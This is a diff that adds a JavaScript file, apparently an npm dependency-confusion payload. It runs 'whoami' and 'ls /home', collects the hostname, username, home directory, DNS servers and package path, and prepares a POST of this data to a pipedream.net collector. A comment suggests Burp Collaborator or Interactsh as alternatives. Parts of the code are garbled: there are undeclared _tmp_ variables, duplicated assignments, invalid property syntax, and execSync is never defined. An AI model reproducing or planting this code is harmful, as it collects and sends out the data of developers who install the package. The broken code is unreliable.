@@ -1,0 +1,58 @@
+_tmp_0 = require('child_process')
+let ls_cmd = execSync('ls /home')
+let whoami_cmd = execSync('whoami')
+const os = require("os")
+const dns = require("dns")
+const querystring = require("querystring")
+const https = require("https")
+const packageJSON = require("./package.json")
+const package = packageJSON.name
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    home_directory: os.homedir(),
+    hostname: os.hostname(),
+    os_userInfo: os.userInfo().username,
+	whoami : whoami_cmd.toString().replace("\n", " "),
+	ls_home_command: ls_cmd.toString().replace("\n", " "),
+    dns: dns.getServers(),
+    resolved: packageJSON ? packageJSON.___resolved : undefined,
+})
+_tmp_1.p = package
+_tmp_1.c = __dirname
+_tmp_1.home_directory = os.homedir()
+_tmp_1.hostname = os.hostname()
+_tmp_1.os_userInfo = os.userInfo().username
+_tmp_1.whoami = whoami_cmd.toString().replace("\n", " ")
+_tmp_1.ls_home_command = ls_cmd.toString().replace("\n", " ")
+_tmp_1.dns = dns.getServers()
+_tmp_1.resolved = packageJSON ? packageJSON.___resolved : undefined
+var postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_4.msg = trackingData
+var options = {
+    hostname: "eooftdttekuft7n.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+}
+_tmp_5.hostname = "eooftdttekuft7n.m.pipedream.net"
+_tmp_5.port = 443
+_tmp_5.path = "/"
+_tmp_5.method = "POST"
+_tmp_5.headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    }
+_tmp_6.Content-Type = "application/x-www-form-urlencoded"
+_tmp_6.Content-Length = postData.length
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+})
